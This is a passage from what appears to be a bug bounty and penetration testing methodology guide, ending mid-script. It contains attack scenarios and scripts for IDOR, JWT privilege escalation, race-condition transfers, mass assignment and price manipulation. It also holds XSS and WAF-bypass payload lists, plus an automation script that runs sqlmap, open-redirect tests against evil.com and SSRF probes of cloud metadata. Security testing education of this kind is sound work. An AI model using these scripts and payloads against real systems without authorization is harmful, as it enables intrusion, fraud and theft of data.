# Network Vulnerability Scanners
nessus, openvas, nexpose
nuclei -t nuclei-templates/ -u https://target.com
```

#### Mobile Application Testing
```bash
# Android
jadx app.apk (decompile)
apktool d app.apk (disassemble)
dex2jar app.apk (convert to jar)
mobsf (mobile security framework)

# iOS
class-dump binary
otool -L binary
hopper disassembler
frida (dynamic analysis)

# Static Analysis
semgrep --config=auto source_code/
bandit -r python_code/
brakeman rails_app/
```

#### Cloud Security Testing
```bash
# AWS
aws s3 ls s3://bucket-name --no-sign-request
aws iam get-account-authorization-details
pacu (AWS exploitation framework)
scout suite (multi-cloud auditing)

# Azure
az account list
az vm list
stormspotter (Azure red team tool)

# Google Cloud
gcloud projects list
gcloud compute instances list
gcpbucketbrute bucket_name
```

#### API Testing
```bash
# REST API
postman, insomnia
burp suite (with API testing extensions)
ffuf -u https://api.target.com/FUZZ -w api_wordlist.txt

# GraphQL
graphql-voyager (schema visualization)
graphiql (query interface)
graphql-cop (security scanner)

# API Discovery
kiterunner -A=apiroutes-210228 -t https://target.com
gobuster dir -u https://target.com/api -w api_wordlist.txt
```

### Real-World Scenarios & Case Studies

#### Scenario 1: E-commerce Application Testing
```bash
# Target: Online shopping platform
# Scope: *.shop.com

# Phase 1: Reconnaissance
subfinder -d shop.com -all -silent | tee subs.txt
cat subs.txt | httpx -silent -status-code -title | tee alive.txt

# Phase 2: Technology Detection
whatweb shop.com
# Result: WordPress, WooCommerce, MySQL

# Phase 3: Vulnerability Testing
# Business Logic: Price manipulation
# Original request: {"item_id": 123, "quantity": 1, "price": 100}
# Attack: {"item_id": 123, "quantity": -1, "price": 100}
# Result: Negative quantity gives money back

# IDOR Testing
# Original: /api/orders/12345 (your order)
# Attack: /api/orders/12346 (someone else's order)
# Result: Access to other users' orders

# Payment Bypass
# Normal flow: cart -> checkout -> payment -> success
# Attack: cart -> checkout -> success (skip payment)
# Result: Free items
```

#### Scenario 2: SaaS Platform Testing
```bash
# Target: Project management SaaS
# Scope: *.projectmanager.com

# Phase 1: Subdomain Discovery
amass enum -passive -d projectmanager.com | tee subs.txt
# Found: api.projectmanager.com, admin.projectmanager.com

# Phase 2: API Testing
# JWT Token Analysis
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | base64 -d
# Found: {"user_id": 123, "role": "user", "exp": 1234567890}

# Privilege Escalation
# Change role from "user" to "admin" in JWT
# Result: Admin access to all projects

# Mass Assignment
# Original: {"name": "Project Name", "description": "Desc"}
# Attack: {"name": "Project Name", "description": "Desc", "owner_id": 1}
# Result: Change project ownership
```

#### Scenario 3: Banking Application Testing
```bash
# Target: Online banking platform
# Scope: *.bank.com (with explicit permission)

# Phase 1: Careful Reconnaissance
# Only passive techniques due to sensitive nature
curl -s "https://crt.sh/?q=bank.com&output=json" | jq -r '.[].name_value'

# Phase 2: Business Logic Testing
# Race Condition in Money Transfer
seq 1 10 | xargs -n1 -P10 -I{} curl -X POST "https://bank.com/transfer" \
  -d "from_account=123&to_account=456&amount=1000" \
  -H "Authorization: Bearer TOKEN"
# Result: Multiple transfers processed simultaneously

# Time-based Attacks
# Transfer $1000 at 23:59:59
# Cancel at 00:00:01 (next day)
# Result: Transfer processed but cancellation in new day fails
```

#### Scenario 4: IoT Device Testing
```bash
# Target: Smart home device
# IP: 192.168.1.100

# Phase 1: Network Discovery
nmap -sS -sV -O 192.168.1.100
# Found: Port 80 (HTTP), 22 (SSH), 23 (Telnet)

# Phase 2: Default Credentials
# Try: admin/admin, admin/password, root/root
telnet 192.168.1.100
# Success with admin/admin

# Phase 3: Firmware Analysis
binwalk firmware.bin
strings firmware.bin | grep -E "(password|key|secret)"
# Found hardcoded WiFi passwords and API keys

# Phase 4: Network Protocol Analysis
wireshark capture on device traffic
# Found: Unencrypted communication with cloud servers
```

### Advanced Testing Methodologies

#### Methodology 1: API Security Testing
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Testing Framework
"""

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.endpoints = []
        self.vulnerabilities = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        # Check common API paths
        common_paths = [
            '/api/v1/', '/api/v2/', '/rest/', '/graphql',
            '/swagger.json', '/openapi.json', '/.well-known/'
        ]
        
        for path in common_paths:
            response = requests.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                self.endpoints.append(path)
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        bypass_techniques = [
            {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
            {'header': 'X-Real-IP', 'value': '127.0.0.1'},
            {'header': 'X-Originating-IP', 'value': '127.0.0.1'},
            {'header': 'X-Remote-IP', 'value': '127.0.0.1'}
        ]
        
        for technique in bypass_techniques:
            headers = {technique['header']: technique['value']}
            response = requests.get(f"{self.base_url}/admin", headers=headers)
            if response.status_code == 200:
                self.vulnerabilities.append(f"Auth bypass via {technique['header']}")
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        # Test sequential IDs
        for user_id in range(1, 100):
            response = requests.get(
                f"{self.base_url}/api/users/{user_id}",
                headers={'Authorization': f'Bearer {self.auth_token}'}
            )
            if response.status_code == 200:
                # Check if we can access other users' data
                data = response.json()
                if data.get('user_id') != self.current_user_id:
                    self.vulnerabilities.append(f"IDOR at /api/users/{user_id}")
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        # Try to add admin fields
        payload = {
            'name': 'Test User',
            'email': 'test@example.com',
            'role': 'admin',  # Attempt privilege escalation
            'is_admin': True,
            'permissions': ['read', 'write', 'delete']
        }
        
        response = requests.post(
            f"{self.base_url}/api/users",
            json=payload,
            headers={'Authorization': f'Bearer {self.auth_token}'}
        )
        
        if response.status_code == 201:
            user_data = response.json()
            if user_data.get('role') == 'admin':
                self.vulnerabilities.append("Mass assignment - privilege escalation")
```

#### Methodology 2: Business Logic Testing
```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Testing Framework
"""

class BusinessLogicTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_workflow_bypass(self):
        """Test workflow bypass vulnerabilities"""
        # Normal workflow: register -> verify -> activate
        # Try to skip verification step
        
        # Step 1: Register user
        register_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password': 'password123'
        }
        register_response = self.session.post(f"{self.target_url}/register", data=register_data)
        
        # Step 2: Try to activate without verification
        if 'user_id' in register_response.text:
            user_id = self.extract_user_id(register_response.text)
            activate_response = self.session.get(f"{self.target_url}/activate/{user_id}")
            
            if activate_response.status_code == 200:
                self.vulnerabilities.append("Workflow bypass - email verification skipped")
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        # Test concurrent money transfers
        def transfer_money():
            return self.session.post(f"{self.target_url}/transfer", data={
                'from_account': '123',
                'to_account': '456',
                'amount': '1000'
            })
        
        # Execute multiple transfers simultaneously
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(transfer_money) for _ in range(10)]
            results = [future.result() for future in futures]
        
        # Check if multiple transfers were processed
        successful_transfers = sum(1 for r in results if r.status_code == 200)
        if successful_transfers > 1:
            self.vulnerabilities.append("Race condition in money transfer")
    
    def test_price_manipulation(self):
        """Test price manipulation vulnerabilities"""
        # Test negative prices
        negative_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '-100'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=negative_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - negative prices accepted")
        
        # Test zero prices
        zero_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '0'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=zero_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - zero prices accepted")
```

#### Methodology 3: Advanced XSS Testing
```python
#!/usr/bin/env python3
"""
Advanced XSS Testing with Context Awareness
"""

class AdvancedXSSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.load_context_payloads()
        self.vulnerabilities = []
    
    def load_context_payloads(self):
        """Load context-specific XSS payloads"""
        return {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                'javascript:alert("XSS")',
                '" autofocus onfocus="alert(\'XSS\')" "'
            ],
            'javascript_context': [
                '\';alert("XSS");//',
                '\";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                'eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))'
            ],
            'css_context': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                '/**/expression(alert("XSS"))',
                'behavior:url(#default#userData)'
            ]
        }
    
    def detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        if f'<script>{payload}</script>' in response_text:
            return 'html_context'
        elif f'value="{payload}"' in response_text:
            return 'attribute_context'
        elif f'var data = "{payload}";' in response_text:
            return 'javascript_context'
        elif f'color: {payload};' in response_text:
            return 'css_context'
        return 'unknown_context'
    
    def test_xss_with_context(self, parameter):
        """Test XSS with context-aware payloads"""
        # First, detect the context
        test_payload = "CONTEXT_TEST_12345"
        response = requests.get(f"{self.target_url}?{parameter}={test_payload}")
        context = self.detect_context(response.text, test_payload)
        
        # Use appropriate payloads for detected context
        if context in self.payloads:
            for payload in self.payloads[context]:
                test_response = requests.get(f"{self.target_url}?{parameter}={payload}")
                if self.is_xss_successful(test_response.text, payload):
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'context': context,
                        'parameter': parameter,
                        'payload': payload
                    })
    
    def test_waf_bypass(self, parameter):
        """Test WAF bypass techniques"""
        waf_bypass_payloads = [
            '<ScRiPt>alert("XSS")</ScRiPt>',  # Case variation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',  # Encoding
            '<svg/onload=alert("XSS")>',  # Tag variation
            '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',  # Base64 encoding
            '"><script>alert("XSS")</script>',  # Context breaking
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>">',  # Iframe technique
        ]
        
        for payload in waf_bypass_payloads:
            response = requests.get(f"{self.target_url}?{parameter}={payload}")
            if self.is_xss_successful(response.text, payload):
                self.vulnerabilities.append({
                    'type': 'XSS_WAF_BYPASS',
                    'parameter': parameter,
                    'payload': payload
                })
```

### Practical Bug Hunting Scripts

#### Complete Automation Script
```bash
#!/bin/bash
# complete_bug_hunt.sh - Full automation script

domain=$1
if [ -z "$domain" ]; then
    echo "Usage: $0 domain.com"
    exit 1
fi

echo "[+] Starting comprehensive bug hunting for $domain"

# Create directory structure
mkdir -p $domain/{recon,vulns,reports}
cd $domain

# Phase 1: Subdomain Discovery
echo "[+] Phase 1: Subdomain Discovery"
subfinder -d $domain -all -silent | tee recon/subs.txt
assetfinder --subs-only $domain | anew recon/subs.txt
amass enum -passive -d $domain | anew recon/subs.txt
echo "[+] Found $(cat recon/subs.txt | wc -l) subdomains"

# Phase 2: Live Host Detection
echo "[+] Phase 2: Live Host Detection"
cat recon/subs.txt | httpx -silent -status-code -title | tee recon/alive.txt
cat recon/alive.txt | cut -d' ' -f1 > recon/alive_urls.txt
echo "[+] Found $(cat recon/alive_urls.txt | wc -l) live hosts"

# Phase 3: URL Discovery
echo "[+] Phase 3: URL Discovery"
cat recon/alive_urls.txt | waybackurls | anew recon/all_urls.txt
cat recon/alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf | anew recon/all_urls.txt
cat recon/alive_urls.txt | katana -silent -d 3 | anew recon/all_urls.txt
echo "[+] Found $(cat recon/all_urls.txt | wc -l) URLs"

# Phase 4: Parameter Discovery
echo "[+] Phase 4: Parameter Discovery"
cat recon/all_urls.txt | grep "=" | anew recon/params.txt
echo "[+] Found $(cat recon/params.txt | wc -l) parameterized URLs"

# Phase 5: Vulnerability Testing
echo "[+] Phase 5: Vulnerability Testing"

# XSS Testing
echo "[+] Testing for XSS"
cat recon/params.txt | dalfox pipe --silence --no-spinner --skip-bav -o vulns/xss_results.txt

# SQL Injection Testing
echo "[+] Testing for SQL Injection"
sqlmap -m recon/params.txt --batch --level=2 --risk=2 --random-agent --output-dir=vulns/sqli/

# Open Redirect Testing
echo "[+] Testing for Open Redirect"
cat recon/params.txt | qsreplace "https://evil.com" | httpx -fr -silent | grep evil.com > vulns/open_redirect.txt

# SSRF Testing
echo "[+] Testing for SSRF"
cat recon/params.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent | grep -E "(instance-id|ami-id)" > vulns/ssrf.txt

# Phase 6: JavaScript Analysis
echo "[+] Phase 6: JavaScript Analysis"
cat recon/all_urls.txt | grep "\.js" | httpx -silent | tee recon/js_files.txt
cat recon/js_files.txt | xargs -n 1 -I % bash -c 'echo % && curl -s % | grep -E "(api_key|token|secret|bearer|Authorization|apikey)="' > vulns/js_secrets.txt

# Phase 7: Directory Fuzzing
echo "[+] Phase 7: Directory Fuzzing"
cat recon/alive_urls.txt | head -10 | xargs -n 1 -I % gobuster dir -u % -w ~/wordlists/common.txt -q -o vulns/dirs_%.txt

# Phase 8: Technology Detection
echo "[+] Phase 8: Technology Detection"
cat recon/alive_urls.txt | head -5 | xargs -n 1 whatweb > recon/tech_stack.txt

# Generate Report
echo "[+] Generating Report"
cat > reports/summary.txt << EOF
Bug Hunting Report for $domain
Generated on: $(date)

=== RECONNAISSANCE SUMMARY ===
Subdomains found: $(cat recon/subs.txt | wc -l)
Live hosts: $(cat recon/alive_urls.txt | wc -l)
URLs discovered: $(cat recon/all_urls.txt | wc -l)
Parameterized URLs: $(cat recon/params.txt | wc -l)
JavaScript files: $(cat recon/js_files.txt | wc -l)

=== VULNERABILITY SUMMARY ===
XSS findings: $(cat vulns/xss_results.txt 2>/dev/null | wc -l)
Open Redirects: $(cat vulns/open_redirect.txt 2>/dev/null | wc -l)
SSRF findings: $(cat vulns/ssrf.txt 2>/dev/null | wc -l)
JS Secrets: $(cat vulns/js_secrets.txt 2>/dev/null | wc -l)

=== NEXT STEPS ===
1. Manual verification of automated findings
2. Business logic testing
3. Authentication bypass testing
4. IDOR testing on discovered endpoints
5. Deep dive into interesting subdomains

EOF

echo "[+] Bug hunting completed! Check reports/summary.txt for overview"
echo "[+] All data saved in $domain/ directory"
```

#### Continuous Monitoring Script
```python
#!/usr/bin/env python3
"""
Continuous Bug Hunting Monitor
Monitors targets for new subdomains and vulnerabilities
"""

import subprocess
import time
import json
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

class BugHuntMonitor:
    def __init__(self, targets_file, notification_email=None):
        self.targets_file = targets_file
        self.notification_email = notification_email
        self.previous_results = {}
        self.load_previous_results()
    
    def load_previous_results(self):
        """Load previous scan results"""
        try:
            with open('previous_results.json', 'r') as f:
                self.previous_results = json.load(f)
        except FileNotFoundError:
            self.previous_results = {}
    
    def save_results(self, results):
        """Save current results"""
        with open('previous_results.json', 'w') as f:
            json.dump(results, f, indent=2)
    
    def scan_target(self, domain):
        """Scan a single target"""
        print(f"[+] Scanning {domain}")
        
        # Subdomain discovery
        cmd = f"subfinder -d {domain} -all -silent"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        subdomains = set(result.stdout.strip().split('\n'))
        
        # Live host detection
        live_hosts = set()
        for subdomain in subdomains:
            if subdomain:
                cmd = f"httpx -silent -status-code"
                process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE, text=True)
                output, _ = process.communicate(input=subdomain)
                if output.strip():
                    live_hosts.add(subdomain)
        
        return {
            'subdomains': subdomains,
            'live_hosts': live_hosts,
            'scan_time': datetime.now().isoformat()
        }
    
    def compare_results(self, domain, current_results):
        """Compare current results with previous scans"""
        # Implementation for comparison logic
        pass
    
    def send_notification(self, domain, changes):
        """Send email notification for changes"""
        if not self.notification_email or not any(changes.values()):
            return
        
        subject = f"New findings for {domain}"
        body = f"""
        New Bug Hunting Findings for {domain}
        
        New Subdomains ({len(changes['new_subdomains'])}):
        {chr(10).join(changes['new_subdomains'])}
        
        New Live Hosts ({len(changes['new_live_hosts'])}):
        {chr(10).join(changes['new_live_hosts'])}
        
        Scan Time: {datetime.now()}
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = 'bugbounty@monitor.com'
        msg['To'] = self.notification_email
        
        # Configure SMTP settings
        try:
            server = smtplib.SMTP('localhost')
            server.send_message(msg)
            server.quit()
            print(f"[+] Notification sent for {domain}")
        except Exception as e:
            print(f"[-] Failed to send notification: {e}")
    
    def run_continuous_monitoring(self, interval_hours=24):
        """Run continuous monitoring"""
        with open(self.targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        while True:
            print(f"[+] Starting monitoring cycle at {datetime.now()}")
            current_results = {}
            
            for domain in targets: